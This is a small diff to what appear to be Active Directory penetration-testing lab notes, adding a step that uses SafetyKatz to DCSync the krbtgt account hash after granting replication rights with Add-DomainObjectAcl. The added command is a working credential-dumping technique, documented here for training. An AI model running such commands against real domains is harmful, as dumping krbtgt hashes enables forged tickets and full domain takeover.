@@ -520,3 +520,7 @@ Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -Princ
 Let's check if now we have the permissions (use the previous command)
 ![[Pasted image 20231025125252.png]]
 Now use safetykatz to extract the hash of any user
+```powershell
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+```
+![[Pasted image 20231025125418.png]]
